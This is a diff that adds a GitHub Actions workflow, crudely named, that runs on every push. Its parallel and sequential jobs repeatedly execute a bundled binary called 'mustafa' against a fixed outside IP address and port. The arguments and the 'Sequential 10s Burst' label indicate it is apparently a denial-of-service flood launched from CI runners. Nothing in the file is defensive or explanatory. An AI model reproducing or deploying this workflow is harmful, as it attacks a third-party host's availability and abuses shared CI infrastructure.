@@ -1,0 +1,52 @@
+name: neo fucker
+on: [push]
+
+jobs:
+
+  stage-0:
+    runs-on: ubuntu-22.04
+    strategy:
+      matrix:
+        n: [1,2,3,4,5]
+    steps:
+      - uses: actions/checkout@v3
+      - run: chmod +x mustafa
+      - run: ./mustafa 91.108.17.7 32003 10 100
+
+  stage-1:
+    needs: stage-0
+    runs-on: ubuntu-22.04
+    strategy:
+      matrix:
+        n: [1,2,3,4,5]
+    steps:
+      - uses: actions/checkout@v3
+      - run: chmod +x mustafa
+      - run: ./mustafa 91.108.17.7 32003 100 100
+
+  stage-2-calc:
+    runs-on: ubuntu-latest
+    outputs:
+      matrix_list: ${{ steps.calc.outputs.matrix_list }}
+    steps:
+      - id: calc
+        run: |
+          
+          NUM_JOBS=$((100 / 10))
+          
+          ARRAY=$(seq 1 $NUM_JOBS | jq -R . | jq -s -c .)
+          echo "matrix_list=$ARRAY" >> $GITHUB_OUTPUT
+
+  stage-2-sequential:
+    needs: [stage-0, stage-2-calc]
+    runs-on: ubuntu-22.04
+    strategy:
+      max-parallel: 1
+      matrix:
+        iteration: ${{ fromJson(needs.stage-2-calc.outputs.matrix_list) }}
+    steps:
+      - uses: actions/checkout@v3
+      - name: Sequential 10s Burst
+        run: |
+          chmod +x mustafa
+          ./mustafa 91.108.17.7 32003 10 100
